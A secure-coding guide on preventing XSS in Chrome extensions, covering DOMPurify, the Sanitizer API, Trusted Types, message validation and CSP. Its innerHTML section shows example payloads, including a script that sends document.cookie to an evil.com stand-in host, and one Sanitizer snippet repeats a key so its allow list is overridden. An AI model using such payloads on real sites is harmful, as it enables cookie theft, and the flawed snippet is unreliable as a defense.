---
layout: default
title: "Prevent XSS in Chrome Extensions: Input Sanitization and Secure DOM Manipulation"
description: "Learn how to prevent cross-site scripting (XSS) attacks in Chrome extensions with DOMPurify, Trusted Types, Sanitizer API, message passing sanitization, and content script security patterns."
canonical_url: "https://theluckystrike.github.io/chrome-extension-guide/guides/chrome-extension-xss-prevention-input-sanitization/"
---

# Prevent XSS in Chrome Extensions: Input Sanitization and Secure DOM Manipulation

Cross-site scripting (XSS) vulnerabilities represent one of the most dangerous security risks in Chrome extensions. Unlike traditional web applications, extensions operate with elevated privileges and can access sensitive browser APIs, modify web page content, and handle confidential user data. A successful XSS attack against an extension can lead to credential theft, session hijacking, malicious code execution, and unauthorized access to browser functionality. This comprehensive guide covers the essential techniques, libraries, and best practices for preventing XSS vulnerabilities in Chrome extensions across all attack surfaces.

## Understanding Extension-Specific XSS Vectors

Chrome extensions face unique XSS challenges that differ from standard web applications. The extension ecosystem introduces several attack vectors that developers must understand and protect against. Content scripts run directly in the context of web pages, inheriting all the XSS risks of the host page while adding new attack surfaces through message passing and DOM manipulation. Background scripts and service workers handle messages from content scripts and must validate all incoming data before processing. Popup pages and options pages, while isolated from arbitrary web content, can still become vulnerable through improper handling of user input or data received from other extension components.

The most critical distinction between web application XSS and extension XSS is the privilege level involved. A successful XSS attack in a web application is typically limited to the compromised page's origin. However, a successful XSS attack in a content script can leverage the extension's permissions to access the Chrome APIs, potentially allowing attackers to read browsing history, modify browser settings, access saved passwords, or intercept communications. This elevated risk profile makes XSS prevention in extensions absolutely critical.

Extensions also face cross-context XSS risks where malicious web pages can attempt to inject code into extension pages through message passing channels. Understanding these vectors requires a comprehensive security mindset that treats all external input as potentially malicious, regardless of its source.

## The Dangers of innerHTML

The innerHTML property represents one of the most common sources of XSS vulnerabilities in Chrome extensions. When you set innerHTML with unsanitized user input, any JavaScript code embedded in that input will execute in the context of your extension or the web page. This makes innerHTML an extremely dangerous operation that should be avoided whenever possible.

```javascript
// DANGEROUS: Never use innerHTML with untrusted input
function displayUserMessage(message) {
  document.getElementById('message-container').innerHTML = message;
}

// Attackers can inject malicious scripts:
displayUserMessage('<img src=x onerror="chrome.cookies.getAll({})">');
displayUserMessage('<script>fetch("https://evil.com/steal?data=" + document.cookie)</script>');
```

The solution is to use textContent instead of innerHTML whenever you only need to display plain text. This property automatically escapes HTML entities, preventing script execution:

```javascript
// SAFE: Use textContent for plain text
function displayUserMessage(message) {
  document.getElementById('message-container').textContent = message;
}
```

When you need to insert structured HTML content, you must sanitize the input using a dedicated sanitization library before insertion. Even then, prefer safer alternatives like the createElement and setAttribute API combination, which provides better security guarantees.

## DOMPurify Integration

DOMPurify is the gold standard for sanitizing HTML in JavaScript applications. It parses HTML and removes all malicious content while preserving safe elements and attributes. For Chrome extensions, DOMPurify should be integrated into any component that displays HTML content derived from external sources.

First, install DOMPurify via your preferred package manager:

```bash
npm install dompurify
```

Then integrate it into your extension's code:

```javascript
import DOMPurify from 'dompurify';

// Configure DOMPurify for extension use
const purify = DOMPurify(window);

// Sanitize HTML before inserting into DOM
function displaySafeHtml(htmlContent) {
  const sanitized = purify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'class', 'target'],
    ALLOW_DATA_ATTR: false,
  });
  
  document.getElementById('content').innerHTML = sanitized;
}

// Handle user-generated content from web pages
function sanitizePageContent(content) {
  return DOMPurify.sanitize(content, {
    WHOLE_DOCUMENT: false,
    RETURN_DOM: false,
    FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
  });
}
```

DOMPurify provides configurable options that allow you to fine-tune what HTML elements and attributes are permitted. For most extension use cases, you should start with a restrictive configuration and only add allowed elements as your requirements demand. The ALLOWED_TAGS and ALLOWED_ATTR options are your primary tools for controlling sanitization behavior.

For content scripts that need to display HTML from the current page, use a more permissive but still controlled configuration:

```javascript
// For content script use with page content
const contentScriptPurify = DOMPurify(window).sanitize;

function displayPageData(data) {
  const container = document.getElementById('page-data');
  container.innerHTML = contentScriptPurify(data, {
    ALLOWED_TAGS: ['h1', 'h2', 'h3', 'p', 'a', 'ul', 'ol', 'li', 'blockquote', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'class', 'target'],
    ADD_ATTR: ['target'], // Allow target for links
  });
}
```

## The Sanitizer API

Modern browsers now offer a native Sanitizer API that provides built-in HTML sanitization without external dependencies. This API is designed to be more secure and performant than library-based solutions while eliminating the risk of dependency vulnerabilities.

```javascript
// Check if Sanitizer API is available
if (window.Sanitizer) {
  const sanitizer = new Sanitizer({
    allowElements: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li'],
    allowAttributes: { 'a': ['href', 'target'] },
    allowElements: [],
  });
  
  function sanitizeAndInsert(htmlString) {
    const element = document.createElement('div');
    element.innerHTML = htmlString;
    const sanitized = sanitizer.sanitize(element);
    document.getElementById('container').appendChild(sanitized);
  }
} else {
  // Fallback to DOMPurify for older browsers
  console.warn('Sanitizer API not available, using DOMPurify');
}
```

The Sanitizer API represents the future of HTML sanitization in browsers. It provides a standards-based approach that will receive browser security updates automatically. However, browser support is still rolling out, so you should maintain DOMPurify as a fallback for the time being.

## Trusted Types API

The Trusted Types API provides a powerful mechanism for preventing DOM XSS by requiring that all potentially dangerous DOM operations use specifically typed objects rather than raw strings. This shifts the security model from allowing developers to remember to sanitize inputs to requiring developers to explicitly create trusted values.

```javascript
// Check Trusted Types support
if (window.trustedTypes && trustedTypes.createPolicy) {
  // Create a policy for your extension's HTML
  const safeHTMLPolicy = trustedTypes.createPolicy('extension-safe-html', {
    createHTML: (input) => {
      // Use DOMPurify as the enforcement point
      return DOMPurify.sanitize(input, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li'],
        ALLOWED_ATTR: ['href', 'class'],
      });
    },
    
    createScriptURL: (input) => {
      // Validate URLs - only allow specific schemes
      const url = new URL(input);
      if (url.protocol === 'https:' || url.protocol === 'chrome-extension:') {
        return input;
      }
      throw new Error('Invalid URL protocol');
    },
  });
  
  // Use the policy
  function safeInnerHTML(html) {
    const trustedHTML = safeHTMLPolicy.createHTML(html);
    document.getElementById('container').innerHTML = trustedHTML;
  }
}
```

To enforce Trusted Types throughout your extension, add a Content-Security-Policy header with the trusted-types directive:

```
Content-Security-Policy: trusted-types extension-safe-html;
```

This prevents any code from using innerHTML with raw strings, ensuring that all HTML insertions go through your sanitization policy. Any attempt to bypass the policy will be blocked by the browser.

## Message Passing Sanitization

Chrome extensions rely heavily on message passing between content scripts, background scripts, and popup pages. Every message represents a potential injection vector that must be validated before processing. Attackers may attempt to send specially crafted messages that exploit vulnerabilities in message handlers.

```javascript
// Content script: Validate messages before processing
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  // Validate message structure
  if (!message || typeof message !== 'object') {
    console.error('Invalid message format');
    return false;
  }
  
  // Whitelist allowed message types
  const allowedTypes = ['PAGE_DATA', 'USER_ACTION', 'STATUS_UPDATE'];
  if (!allowedTypes.includes(message.type)) {
    console.error('Unknown message type:', message.type);
    return false;
  }
  
  // Validate message payload based on type
  switch (message.type) {
    case 'PAGE_DATA':
      if (typeof message.data !== 'object' || !message.data.url) {
        return false;
      }
      // Sanitize string values
      message.data.title = sanitizeString(message.data.title);
      message.data.url = sanitizeString(message.data.url);
      break;
      
    case 'USER_ACTION':
      if (typeof message.action !== 'string') {
        return false;
      }
      // Validate action against allowed values
      const allowedActions = ['click', 'scroll', 'select', 'input'];
      if (!allowedActions.includes(message.action)) {
        return false;
      }
      break;
  }
  
  // Process validated message
  handleMessage(message);
  return true;
});

// Sanitization helper
function sanitizeString(str) {
  if (typeof str !== 'string') return '';
  return DOMPurify.sanitize(str, { RETURN_TRUSTED_TYPE: true }).toString();
}
```

Background scripts should implement equally strict validation, treating all incoming messages as potentially malicious. The background script's access to Chrome APIs makes it an especially valuable target for attackers.

## Content Script Injection Risks

Content scripts run in the context of web pages and face unique security challenges. They share the page's DOM but execute in an isolated JavaScript environment. However, data passed between the page and content script can still create vulnerabilities.

Avoid evaluating JavaScript from the page or passing functions between contexts:

```javascript
// DANGEROUS: Never use these patterns
function executePageScript(script) {
  eval(script); // Never eval page content
}

function passFunctionToPage() {
  window.pageFunction = function() { /* sensitive code */ };
}
```

When extracting data from web pages, always sanitize before using or storing:

```javascript
// SAFE: Extract and sanitize page data
function extractPageData() {
  const title = document.title;
  const headings = Array.from(document.querySelectorAll('h1, h2, h3'))
    .map(h => DOMPurify.sanitize(h.textContent));
  
  return {
    title: DOMPurify.sanitize(title),
    headings: headings,
    url: window.location.href,
  };
}
```

Content scripts should also be careful about what they expose to the page through the window object. Avoid attaching sensitive data or functions directly to DOM elements that the page can access.

## Popup and Options Page Security

Popup pages and options pages are HTML pages that run in the extension's context. While they don't directly interact with web page content, they can still be vulnerable to XSS through stored data, message passing, or improper handling of extension storage.

```javascript
// popup.js or options.js

// Always sanitize data from storage before displaying
async function loadAndDisplaySettings() {
  const settings = await chrome.storage.local.get('userSettings');
  const container = document.getElementById('settings');
  
  if (settings.userSettings) {
    // Sanitize each field before display
    container.textContent = settings.userSettings.customMessage || '';
    document.getElementById('username').textContent = 
      DOMPurify.sanitize(settings.userSettings.username || '');
  }
}

// Validate form input before saving
document.getElementById('settings-form').addEventListener('submit', async (e) => {
  e.preventDefault();
  const formData = new FormData(e.target);
  
  // Validate and sanitize input
  const username = formData.get('username');
  if (typeof username !== 'string' || username.length > 50) {
    showError('Invalid username');
    return;
  }
  
  // Sanitize before storage
  const sanitizedUsername = DOMPurify.sanitize(username);
  
  await chrome.storage.local.set({
    userSettings: { username: sanitizedUsername }
  });
});
```

Options pages should also implement input validation to ensure that stored settings cannot contain malicious content. This is especially important when those settings are later displayed in other extension contexts.

## Content Security Policy as a Defense Layer

A strong Content Security Policy serves as your last line of defense against XSS attacks. Even if sanitization fails or is accidentally bypassed, a properly configured CSP can prevent script execution and limit the damage of successful attacks. For Chrome extensions, CSP is configured in the manifest file.

```json
{
  "manifest_version": 3,
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self'; style-src 'self' 'unsafe-inline';"
  }
}
```

The extension_pages directive controls the CSP for popup pages, options pages, and background service workers. For content scripts, the CSP is determined by the host page, but you can use the sandbox attribute to create isolated contexts.

A robust CSP for extension pages should:

- Use 'self' to restrict scripts to your extension's origin
- Avoid 'unsafe-inline' for scripts when possible
- Use nonces or hashes for inline scripts in high-security scenarios
- Restrict object-src to prevent Flash or other plugin-based attacks
- Consider using 'strict-dynamic' with Trusted Types

See the [Chrome Extension Content Security Policy](/guides/chrome-extension-content-security-policy/) guide for detailed configuration options and patterns.

## Automated Security Scanning

Regular security scanning helps identify XSS vulnerabilities before they reach production. Several tools can automatically detect common XSS patterns in extension code.

```yaml
# .github/workflows/security-scan.yml
name: Security Scan

on: [push, pull_request]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run ESLint with security rules
        run: |
          npm install eslint eslint-plugin-security
          npx eslint --ext .js,.jsx .
      
      - name: Check for vulnerable dependencies
        run: |
          npm audit --audit-level=high
      
      - name: Run static analysis
        run: |
          npm install -g snyk
          snyk test
```

Integrate security scanning into your development workflow and CI/CD pipeline. Tools like ESLint with the security plugin can catch dangerous patterns like innerHTML usage, while dependency scanners identify known vulnerabilities in your dependencies.

## OWASP for Extensions

The OWASP Foundation provides resources specifically relevant to extension security. The OWASP Top 10 includes several categories directly applicable to Chrome extension development, including A03:2021-Injection, which covers XSS vulnerabilities.

Key OWASP principles for extension development include:

- **Input Validation**: Validate all input from content scripts, storage, and message passing
- **Output Encoding**: Encode output when inserting data into HTML, JavaScript, or URLs
- **Defense in Depth**: Layer multiple security controls so that if one fails, others provide protection
- **Least Privilege**: Request only the minimum permissions necessary
- **Secure Defaults**: Design secure defaults that require explicit action to weaken security

Review the [Chrome Extension Security Hardening](/guides/chrome-extension-security-hardening/) guide for comprehensive security practices that complement XSS prevention.

## Conclusion

XSS prevention in Chrome extensions requires a multi-layered approach that addresses every attack surface. Never trust user input, whether it comes from web pages, storage, or message passing. Use textContent instead of innerHTML whenever possible, and employ DOMPurify or the Sanitizer API for HTML content. Implement Trusted Types to enforce secure DOM manipulation at the browser level. Configure strong Content Security Policies as your defense-in-depth layer, and integrate automated security scanning into your development workflow.

By following these practices and staying aware of the unique security challenges in the extension ecosystem, you can build extensions that protect users from XSS attacks while providing valuable functionality.

---

*Part of the Chrome Extension Guide by theluckystrike. More at zovo.one*
